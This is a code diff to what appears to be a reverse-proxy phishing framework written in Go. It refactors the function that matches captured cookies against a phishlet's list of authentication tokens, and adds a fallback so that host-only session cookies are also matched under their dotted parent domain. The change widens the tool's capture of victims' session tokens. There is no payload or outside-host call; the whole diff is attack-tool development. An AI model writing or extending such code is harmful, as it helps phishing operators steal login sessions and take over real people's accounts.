@@ -1027,7 +1027,7 @@ func (p *Phishlet) domainExists(domain string) bool {
 	return false
 }
 
-func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
+func (p *Phishlet) matchAuthToken(domain string, token string) *CookieAuthToken {
 	if tokens, ok := p.cookieAuthTokens[domain]; ok {
 		for _, at := range tokens {
 			if at.re != nil {
@@ -1038,6 +1038,18 @@ func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
 				return at
 			}
 		}
+	}
+	return nil
+}
+
+func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
+	if at := p.matchAuthToken(domain, token); at != nil {
+		return at
+	}
+	// cookies without a Domain attribute (host-only) are stored under the bare hostname,
+	// so also match against the parent dotted domain entry
+	if !strings.HasPrefix(domain, ".") {
+		return p.matchAuthToken("."+domain, token)
 	}
 	return nil
 }
